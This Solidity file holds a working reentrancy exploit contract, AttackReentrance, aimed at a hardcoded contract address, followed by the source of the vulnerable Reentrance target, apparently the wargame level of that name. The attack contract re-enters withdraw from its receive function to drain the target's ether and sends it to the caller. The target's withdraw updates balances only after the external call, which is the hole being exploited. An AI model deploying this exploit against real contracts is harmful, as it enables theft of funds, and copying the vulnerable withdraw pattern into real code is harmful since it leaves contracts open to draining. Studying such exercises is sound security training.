// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract AttackReentrance{
    using SafeMath for uint256;

    address payable constant s_target = 0xF304534eE098eBdac2bb08944fdEC4D0275Ca1C8;

    receive() external payable {
        uint balance = Reentrance(s_target).balanceOf(address(this));
        if (s_target.balance >= balance) {
            Reentrance(s_target).withdraw(balance);
        } else {
            Reentrance(s_target).withdraw(s_target.balance);
        }
    }

    function attack() external payable {
        Reentrance(s_target).donate{value: msg.value}(address(this));
        uint balance = Reentrance(s_target).balanceOf(address(this));
        require(balance == msg.value, "Donate failed");
        Reentrance(s_target).withdraw(balance);
        payable(msg.sender).transfer(address(this).balance);
    }
}

// source code
contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}